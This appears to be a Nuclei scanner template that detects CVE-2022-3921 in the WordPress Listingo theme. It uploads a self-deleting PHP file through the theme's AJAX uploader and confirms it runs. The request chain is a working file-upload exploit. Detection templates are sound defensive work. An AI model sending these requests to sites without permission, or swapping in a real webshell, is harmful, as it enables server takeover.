@@ -1,0 +1,53 @@
+id: wordpress-theme-listingo-file-upload
+
+info:
+  name: WordPress Listingo File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    WordPress theme Listingo versions before 3.2.7 are vulnerable to a file upload issue via the AJAX operation, allowing attackers to upload malicious webshells.
+  reference:
+    - https://wpscan.com/vulnerability/e39b59b0-f24f-4de5-a21c-c4de34c3a14f
+  classification:
+    cve-id: CVE-2022-3921
+    cvss-score: 9.8
+  tags: file-upload,wordpress
+
+variables:
+  boundary: "----WebKitFormBoundary8rVjnfcgxgKoytcg"
+  payload: |
+    {{boundary}}\r\nContent-Disposition: form-data; name="listingo_uploader"; filename="phppoc.php"\r\nContent-Type: text/php\r\n\r\n<?php echo md5(233);unlink(__FILE__);?>\r\n{{boundary}}\r\nContent-Disposition: form-data; name="submit"\r\n\r\nStart Upload\r\n{{boundary}}--\r\n
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-shell
+    method: POST
+    path:
+      - "/wp-admin/admin-ajax.php?action=listingo_temp_uploader"
+    headers:
+      Content-Type: "multipart/form-data; boundary={{boundary}}"
+    body: "{{payload}}"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - ",\"filename\":\""
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - ",\"filename\":\"(.*?).php\","
+
+  - id: validate-shell
+    method: GET
+    path:
+      - "/wp-content/uploads/wp-custom-uploader/{{upload-shell.filename}}.php"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
